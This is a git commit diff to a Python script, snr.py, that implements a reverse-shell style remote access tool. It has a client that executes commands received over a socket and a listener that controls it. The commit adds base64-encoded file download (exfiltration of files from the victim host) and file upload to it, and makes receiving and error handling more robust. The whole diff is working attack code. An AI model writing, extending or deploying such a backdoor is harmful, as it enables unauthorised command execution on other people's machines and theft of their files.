09bef35acb7c4d8958c6029a4cee93d9c1ea7f6e
koushik <58215686+koushikfs@users.noreply.github.com>
2021-12-04 20:27:55 +0530

    Update snr.py

--- snr.py
+++ snr.py
@@ -1,3 +1,4 @@
+import base64
 import optparse, socket, subprocess, json, os
 
 
@@ -28,8 +29,13 @@ class Sender_N_Receiver:
             self.connection.send(bytes(json_data, 'utf-8'))
 
         def reliable_recieve(self):
-            result = self.connection.recv(1024)
-            return json.loads(result)
+            result = b''
+            while True:
+                try:
+                    result = result + self.connection.recv(1024)
+                    return json.loads(result)
+                except json.decoder.JSONDecodeError:
+                    continue
 
         def execute_commands(self, command_given):
             try:
@@ -38,12 +44,23 @@ class Sender_N_Receiver:
                 return b"[-]invaid command"
 
         def change_working_directory(self, path):
-            os.chdir(path)
-            return b"[+]changing working directory to "+bytes(path, 'utf-8')
+            try:
+                os.chdir(path)
+                return b"[+]changing working directory to "+bytes(path, 'utf-8')
+            except FileNotFoundError:
+                return b"[-]no such directory/path"
 
         def read_files(self, path):
-            with open(path, "rb") as file:
-                return file.read()
+            try:
+                with open(path, "rb") as file:
+                    return base64.b64encode(file.read())
+            except FileNotFoundError:
+                return base64.b64encode(b"[-]file not found...")
+
+        def write_files(self, path, content):
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(bytes(content, 'utf-8')))
+            return b"[+]upload done ...."
 
         def make_connection(self):
             output = ""
@@ -57,6 +74,8 @@ class Sender_N_Receiver:
                     output = self.change_working_directory(command[1])
                 elif command[0] == "download":
                     output = self.read_files(command[1])
+                elif command[0] == "upload":
+                    output = self.write_files(command[1], command[2])
                 else:
                     output = self.execute_commands(command)
                 self.reliable_send(output)
@@ -76,15 +95,13 @@ class Sender_N_Receiver:
             print("[+]got connection from " + str(self.address))
             self.listener_start()
 
-        def reliable_send(self, data):
-            if data[0] == "close":
-                json_data = json.dumps(data)
+        def reliable_send(self, commands):
+            if commands[0] == "close":
+                json_data = json.dumps(commands)
                 self.connection.send(bytes(json_data, 'utf-8'))
                 self.connection.close()
                 exit()
-            elif data[0] == "download":
-                data = self.read_files(data[1])
-            json_data = json.dumps(data)
+            json_data = json.dumps(commands)
             self.connection.send(bytes(json_data, 'utf-8'))
 
         def reliable_recieve(self):
@@ -97,16 +114,47 @@ class Sender_N_Receiver:
                     continue
 
         def read_files(self, path):
-            with open(path, "rb") as file:
-                return file.read()
+            try:
+                with open(path, "rb") as file:
+                    return base64.b64encode(file.read())
+            except FileNotFoundError:
+                return b"[-]file not found..."
+
+        def write_files(self, path, content):
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(bytes(content, 'utf-8')))
+            return "[+]Download done ...."
 
         def listener_start(self):
-            while True:
-                command = input(">> ")
-                command = command.split(" ")
-                self.reliable_send(command)
-                result = self.reliable_recieve()
-                print("\n" + result)
+            try:
+                while True:
+                    command = input(">> ")
+                    command = command.split(" ")
+                    if command[0] == "upload":
+                        command.append(self.read_files(command[1]).decode('UTF-8'))
+                        if command[2] == "[-]file not found...":
+                            print("\n" + command[2])
+                            continue
+                    self.reliable_send(command)
+                    result = self.reliable_recieve()
+                    if command[0] == "download":
+                        try:
+                            if base64.b64decode(result).decode('UTF-8') == "[-]file not found...":
+                                print("\n" + base64.b64decode(result).decode('UTF-8'))
+                                continue
+                        except UnicodeDecodeError:
+                            pass
+                        result = self.write_files(command[1], result)
+                    print("\n" + result)
+            except KeyboardInterrupt:
+                commands = ["close"]
+                json_data = json.dumps(commands)
+                self.connection.send(bytes(json_data, 'utf-8'))
+                self.connection.close()
+                print("\n[+]Quiting...")
+                exit()
+            except Exception:
+                pass
 
 
 def get_arguments():
